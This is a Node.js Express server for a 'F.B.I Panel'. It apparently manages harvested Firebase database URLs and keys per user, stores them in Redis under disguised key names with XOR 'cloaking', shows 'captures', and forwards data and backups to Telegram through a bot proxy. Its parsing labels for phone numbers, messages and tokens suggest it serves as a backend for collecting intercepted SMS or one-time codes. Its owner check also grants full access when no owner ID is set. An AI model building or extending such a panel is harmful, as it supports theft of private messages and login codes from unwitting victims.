'use strict';

require('dotenv').config();
var express = require('express');
var path = require('path');

var app = express();
var sessionMod = require('./lib/session');
var requirePanelSession = sessionMod.ensurePanelSession;
var PORT = parseInt(process.env.PORT || '3000', 10);

var DEFAULT_CONFIG = {
  channelId: '', myNumber: '', firebases: [],
  forwardEnabled: true, forwardMode: 'all', botEnabled: true,
  autoBackup: true, autoBackupHour: 3, channelNotify: true, broadcastDelay: 60,
  numStart: '', numEnd: '', msgStart: '', msgEnd: '',
  numLabels: ['To', 'Receipt', 'Number', 'Mobile', 'Target', 'Phone'],
  msgLabels: ['Message', 'Msg', 'Body', 'Token', 'Text']
};

var RK_USER = process.env.RK_USER || '_cache_usr';
var RK_USERSET = process.env.RK_USERSET || '_cache_idx';
var RK_SENT = process.env.RK_SENT || '_cache_log';
var RK_PREFIX = process.env.RK_PREFIX || '_c1_';
var OWNER_ID = String(process.env.OWNER_ID || '').trim();
var CLOAK_KEY = process.env.CLOAK || '';
var BOT_TOKEN = process.env.BOT_TOKEN || '';
var TG_API = process.env.TG_API || (BOT_TOKEN ? 'https://api.telegram.org/bot' + BOT_TOKEN : '');
var REDIS_URL = process.env.REDIS_URL || '';
var REDIS_TOKEN = process.env.REDIS_TOKEN || '';

var panelStateMod = require('./lib/panel-state');
var tgWorker = require('./lib/tg-worker');
var ownerCmdMod = require('./lib/owner-cmd');
var ownerBackupMod = require('./lib/backup-full');

app.use(express.json({ limit: '32mb' }));

function buildPublicConfig(){
  return {
    BLOB_BASE: '/api/blob',
    TG_CHANNEL_LINK: process.env.TG_CHANNEL_LINK || '',
    LS_BLOB: process.env.LS_BLOB || 'fbi_blob_id',
    LS_CACHE: process.env.LS_CACHE || 'fbi_config_cache',
    LS_SESSION: process.env.LS_SESSION || 'fbi_session',
    LS_ACTIVE: process.env.LS_ACTIVE || 'fbi_active_device',
    POLL_DEV: parseInt(process.env.POLL_DEV || '5000', 10),
    POLL_MSG: parseInt(process.env.POLL_MSG || '2000', 10),
    POLL_BG: parseInt(process.env.POLL_BG || '3000', 10),
    POLL_BAL: parseInt(process.env.POLL_BAL || '25000', 10),
    DEFAULT_CONFIG: DEFAULT_CONFIG,
    serverTelegramBot: process.env.SERVER_TELEGRAM_BOT === 'true'
  };
}

async function tgDirect(method, query, payload){
  if(!BOT_TOKEN) return { ok: false, description: 'no token' };
  var url = TG_API + '/' + method + (query ? '?' + query : '');
  var opts = payload != null
    ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
    : { method: 'GET' };
  var r = await fetch(url, opts);
  return r.json();
}

async function tgSend(chatId, text){
  return tgDirect('sendMessage', '', { chat_id: chatId, text: text, parse_mode: 'HTML' });
}

async function tgSendDocument(chatId, text, filename, caption){
  var content = Buffer.from(String(text), 'utf8');
  var fd = new FormData();
  fd.append('chat_id', String(chatId));
  fd.append('caption', caption || '');
  fd.append('parse_mode', 'HTML');
  fd.append('document', new Blob([content], { type: 'text/plain;charset=utf-8' }), filename || 'report.txt');
  var r = await fetch(TG_API + '/sendDocument', { method: 'POST', body: fd });
  return r.json();
}

async function redisGetOwner(key, actorUid){
  return (await redisCmdVault(actorUid, ['GET', key])).result;
}

async function redisSMembersOwner(key, actorUid){
  return (await redisCmdVault(actorUid, ['SMEMBERS', key])).result || [];
}

async function redisDelOwner(key, actorUid){
  return redisCmdVault(actorUid, ['DEL', key]);
}

async function redisSRemOwner(set, member, actorUid){
  return redisCmdVault(actorUid, ['SREM', set, member]);
}

async function redisSAddOwner(set, member, actorUid){
  return redisCmdVault(actorUid, ['SADD', set, member]);
}

async function getUserProfileOwner(uid){
  var v = await redisGetOwner(RK_USER + ':' + uid, uid);
  if(!v) return null;
  try{ return JSON.parse(v); }catch(e){ return null; }
}

var backupRunner = ownerBackupMod.createBackupRunner({
  RK_PREFIX: RK_PREFIX,
  RK_SENT: RK_SENT,
  RK_USERSET: RK_USERSET,
  RK_USER: RK_USER,
  redisGet: redisGetOwner,
  redisSMembers: redisSMembersOwner,
  redisDel: redisDelOwner,
  redisSRem: redisSRemOwner,
  redisSAdd: redisSAddOwner,
  getUserProfile: getUserProfileOwner,
  tgSend: tgSend,
  tgSendDocument: tgSendDocument
});

var _lastAutoBackupDate = '';

var handleOwnerCommand = ownerCmdMod.createOwnerHandlers({
  tgCall: tgDirect,
  isOwner: isOwner,
  getAllUserIds: function(actorUid){ return redisSMembersOwner(RK_USERSET, actorUid); },
  getWorkerStatus: tgWorker.getStatus,
  runBackupFull: backupRunner.runBackupFull,
  runBackupNew: backupRunner.runBackupNew
});

async function handleUserPrivate(msg){
  var chatId = String(msg.chat.id);
  var from = msg.from || {};
  var key = RK_USER + ':' + chatId;
  var existing = await redisCmdVault(chatId, ['GET', key]);
  var prof = null;
  if(existing.ok && existing.result){
    try{ prof = JSON.parse(existing.result); }catch(e){}
  }
  if(!prof){
    prof = { id: chatId, first_name: from.first_name || '', last_name: from.last_name || '', username: from.username || '', joinedAt: Date.now(), verified: true };
  } else {
    prof.first_name = from.first_name || prof.first_name;
    prof.last_name = from.last_name || prof.last_name;
    prof.username = from.username || prof.username;
  }
  prof.lastSeen = Date.now();
  await redisCmdVault(chatId, ['SET', key, JSON.stringify(prof)]);
  await redisCmdVault(chatId, ['SADD', RK_USERSET, chatId]);
}

function bootTelegramWorker(){
  var webhookBase = String(process.env.WEBHOOK_URL || process.env.PUBLIC_URL || '').trim().replace(/\/+$/, '');
  var webhookUrl = webhookBase ? webhookBase + '/api/tg/webhook' : '';
  tgWorker.startWorker({
    botToken: BOT_TOKEN,
    tgApiBase: TG_API,
    isOwner: isOwner,
    handleOwnerCommand: handleOwnerCommand,
    handleUserPrivate: handleUserPrivate
  }, { webhookUrl: webhookUrl, force: false });
}

function startAutoBackupTimer(){
  setInterval(async function(){
    try{
      var st = panelStateMod.getState();
      var uc = st.userConfig || {};
      if(!uc.autoBackup || !OWNER_ID) return;
      var target = uc.channelId || OWNER_ID;
      if(!target) return;
      var today = new Date().toISOString().slice(0, 10);
      if(_lastAutoBackupDate === today) return;
      var targetHour = uc.autoBackupHour != null ? uc.autoBackupHour : 3;
      if(new Date().getHours() < targetHour) return;
      _lastAutoBackupDate = today;
      await backupRunner.runBackupNew(target, OWNER_ID);
    }catch(e){ console.warn('[AutoBackup]', e.message); }
  }, 60000);
}

function startTgWatchdog(){
  setInterval(function(){
    if(!BOT_TOKEN) return;
    if(!tgWorker.isRunning()) bootTelegramWorker();
  }, 15000);
}

function isOwner(uid){
  if(!OWNER_ID) return true;
  return String(uid) === OWNER_ID;
}

function cloak(str){
  try{
    var k = CLOAK_KEY || 'key';
    var s = String(str);
    var out = '';
    for(var i = 0; i < s.length; i++){ out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
    return Buffer.from(out, 'binary').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
  }catch(e){ return str; }
}

function uncloak(str){
  try{
    var k = CLOAK_KEY || 'key';
    var s = String(str).replace(/-/g, '+').replace(/_/g, '/');
    while(s.length % 4) s += '=';
    var raw = Buffer.from(s, 'base64').toString('binary');
    var out = '';
    for(var i = 0; i < raw.length; i++){ out += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
    return out;
  }catch(e){ return str; }
}

function isSlotKey(key){
  return key.indexOf(RK_PREFIX) === 0 && key.length > RK_PREFIX.length;
}

function slotUidFromKey(key){
  return key.slice(RK_PREFIX.length);
}

function isProfileKey(key){
  var pref = RK_USER + ':';
  return key.indexOf(pref) === 0 && key.length > pref.length;
}

function profileUidFromKey(key){
  return key.slice((RK_USER + ':').length);
}

function redisAllowed(actorUid, cmd){
  if(!Array.isArray(cmd) || !cmd.length) return false;
  var op = String(cmd[0]).toUpperCase();
  var key = cmd[1];
  if(typeof key !== 'string') return false;
  actorUid = String(actorUid || '');

  if(op === 'SMEMBERS'){
    if(key === RK_USERSET || key === RK_SENT) return isOwner(actorUid);
    return false;
  }
  if(op === 'SADD'){
    if(key === RK_USERSET) return true;
    if(key === RK_SENT) return isOwner(actorUid);
    return false;
  }
  if(op === 'SREM' && key === RK_USERSET) return isOwner(actorUid);

  if(isSlotKey(key)){
    if(op === 'GET' || op === 'DEL') return isOwner(actorUid) || slotUidFromKey(key) === actorUid;
    if(op === 'SET') return slotUidFromKey(key) === actorUid || isOwner(actorUid);
    return false;
  }

  if(isProfileKey(key)){
    if(op === 'GET') return isOwner(actorUid) || profileUidFromKey(key) === actorUid;
    if(op === 'SET') return profileUidFromKey(key) === actorUid;
    return false;
  }

  return false;
}

async function redisCmdRaw(cmd){
  if(!REDIS_URL || !REDIS_TOKEN) return { result: null };
  var r = await fetch(REDIS_URL, {
    method: 'POST',
    headers: {
      Authorization: 'Bearer ' + REDIS_TOKEN,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(cmd)
  });
  if(!r.ok) return { result: null };
  return r.json();
}

async function redisCmdVault(actorUid, cmd){
  if(!redisAllowed(actorUid, cmd)) return { ok: false, error: 'forbidden', result: null };
  var op = String(cmd[0]).toUpperCase();
  var key = cmd[1];
  var send = cmd.slice();

  if(isSlotKey(key) && op === 'SET' && send[2] != null){
    send[2] = cloak(String(send[2]));
  }

  var out = await redisCmdRaw(send);
  if(out && out.result != null && isSlotKey(key) && op === 'GET'){
    try{ out.result = uncloak(String(out.result)); }catch(e){}
  }
  return { ok: true, result: out.result };
}

app.get('/api/config', function(_req, res){
  res.setHeader('Cache-Control', 'no-store');
  res.json(buildPublicConfig());
});

var blobProxy = require('./lib/blob-proxy');

app.post('/api/blob', requirePanelSession, async function(req, res){
  var out = await blobProxy.blobCreate(req.body);
  if(!out.ok) return res.status(out.status || 502).json({ ok: false });
  res.status(201).json({ ok: true, id: out.id });
});

app.get('/api/blob/:id', requirePanelSession, async function(req, res){
  var out = await blobProxy.blobGet(req.params.id);
  if(!out.ok) return res.status(out.status || 502).json({ ok: false });
  res.json(out.data != null ? out.data : {});
});

app.put('/api/blob/:id', requirePanelSession, async function(req, res){
  var out = await blobProxy.blobPut(req.params.id, req.body);
  if(!out.ok) return res.status(out.status || 502).json({ ok: false });
  res.json({ ok: true });
});

app.use('/api/panel', requirePanelSession);

app.post('/api/panel/sync', function(req, res){
  panelStateMod.mergePanelSync(req.body || {});
  tgWorker.onPanelSync();
  res.json({ ok: true, tg: tgWorker.getStatus() });
});

app.get('/api/panel/tg-status', function(_req, res){
  res.setHeader('Cache-Control', 'no-store');
  res.json(tgWorker.getStatus());
});

app.get('/api/panel/captures', function(_req, res){
  res.setHeader('Cache-Control', 'no-store');
  res.json({ captures: panelStateMod.getState().recentCaptures || [] });
});

app.post('/api/tg/webhook', function(req, res){
  res.sendStatus(200);
  if(!req.body) return;
  var u = req.body;
  if(u.update_id != null) tgWorker.ingestUpdate(u);
  else if(Array.isArray(u)) u.forEach(function(x){ tgWorker.ingestUpdate(x); });
});

app.use('/api/vault', requirePanelSession);
app.use('/api/tg', requirePanelSession);

app.post('/api/vault/owner-check', function(req, res){
  var uid = String((req.body && req.body.uid) || '');
  res.json({ isOwner: isOwner(uid) });
});

app.post('/api/vault/firebase-save', async function(req, res){
  var uid = String((req.body && req.body.uid) || '');
  var url = String((req.body && req.body.url) || '').trim().replace(/\/+$/, '');
  var key = String((req.body && req.body.key) || '');
  var label = String((req.body && req.body.label) || '');
  if(!uid || !url) return res.status(400).json({ ok: false, error: 'missing uid or url' });

  var slotKey = RK_PREFIX + uid;
  var existing = await redisCmdVault(uid, ['GET', slotKey]);
  var list = [];
  if(existing.ok && existing.result){
    try{ list = JSON.parse(existing.result) || []; }catch(e){ list = []; }
  }
  if(!list.some(function(x){ return x.u === url; })){
    list.push({ u: url, k: key, l: label, t: Date.now() });
    if(list.length > 20) list = list.slice(-20);
  }
  var setR = await redisCmdVault(uid, ['SET', slotKey, JSON.stringify(list)]);
  await redisCmdVault(uid, ['SADD', RK_USERSET, uid]);
  res.json({ ok: !!(setR && setR.ok) });
});

app.post('/api/vault/redis', async function(req, res){
  var uid = String((req.body && req.body.uid) || '');
  var cmd = req.body && req.body.cmd;
  var out = await redisCmdVault(uid, cmd);
  if(!out.ok) return res.status(403).json(out);
  res.json(out);
});

app.post('/api/tg', async function(req, res){
  if(!BOT_TOKEN) return res.status(503).json({ ok: false, description: 'Bot not configured' });
  var method = String((req.body && req.body.method) || 'getMe');
  var query = String((req.body && req.body.query) || '').replace(/^\?/, '');
  var payload = req.body && req.body.payload;
  var url = TG_API + '/' + method + (query ? '?' + query : '');
  try{
    var opts = payload != null
      ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
      : { method: 'GET' };
    var r = await fetch(url, opts);
    var data = await r.json();
    res.json(data);
  }catch(e){
    res.status(502).json({ ok: false, description: e.message || 'Telegram proxy failed' });
  }
});

app.post('/api/tg/sendDocument', async function(req, res){
  if(!BOT_TOKEN) return res.status(503).json({ ok: false, description: 'Bot not configured' });
  var chatId = req.body && req.body.chat_id;
  var caption = String((req.body && req.body.caption) || '');
  var filename = String((req.body && req.body.filename) || 'report.txt');
  var b64 = String((req.body && req.body.contentBase64) || '');
  if(chatId == null || !b64) return res.status(400).json({ ok: false, description: 'Missing chat_id or content' });
  try{
    var content = Buffer.from(b64, 'base64');
    var fd = new FormData();
    fd.append('chat_id', String(chatId));
    fd.append('caption', caption);
    fd.append('parse_mode', 'HTML');
    fd.append('document', new Blob([content], { type: 'text/plain;charset=utf-8' }), filename);
    var r = await fetch(TG_API + '/sendDocument', { method: 'POST', body: fd });
    var data = await r.json();
    res.json(data);
  }catch(e){
    res.status(502).json({ ok: false, description: e.message || 'sendDocument failed' });
  }
});

app.use(function(req, res, next){
  var base = path.basename(req.path || '');
  if(base === '.env' || base === '.env.example' || base === 'server.js') return res.sendStatus(404);
  next();
});

app.use(express.static(path.join(__dirname), {
  index: 'index.html',
  dotfiles: 'ignore'
}));

app.listen(PORT, function(){
  console.log('F.B.I Panel → http://localhost:' + PORT);
  console.log('Secrets stay in .env — Telegram bot runs in user browser (panel open)');
  if(BOT_TOKEN && process.env.SERVER_TELEGRAM_BOT === 'true'){
    bootTelegramWorker();
    startTgWatchdog();
    console.log('SERVER_TELEGRAM_BOT=true — server worker also enabled');
  }
  startAutoBackupTimer();
});
